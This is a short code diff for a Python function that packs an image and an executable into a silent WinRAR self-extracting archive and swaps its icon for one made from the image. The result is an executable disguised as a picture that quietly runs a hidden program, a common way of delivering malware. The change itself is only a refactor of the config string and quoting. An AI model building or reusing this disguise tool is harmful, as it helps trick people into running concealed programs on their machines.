@@ -17,22 +17,13 @@ def create_archive(exe: str, img: str):
     create_icon(img)
 
     with open(CONFIG, "w") as f:
-        contents = f"""
-            Setup={img}
-            Setup={exe}
-            TempMode
-            Silent=1
-            Overwrite=1
-            Update=U
-        """
-
-        f.write(contents.strip().replace(" ", ""))
+        f.write(f'Setup={img}\nSetup={exe}\nTempMode\nSilent=1\nOverwrite=1\nUpdate=U')
 
     temp = "temp.exe"
     out = "archive.exe"
 
     commands = [
-        f"rar a -sfx -z{CONFIG} {temp} {exe} {img}",
+        f'rar a -sfx -z{CONFIG} {temp} {exe} {img}',
         f'ResourceHacker.exe -open {temp} -save {temp} -action delete -res ICONGROUP,1,',
         f'ResourceHacker.exe -open {temp} -save {out} -action add -res temp.ico -mask ICONGROUP,1,'
     ]
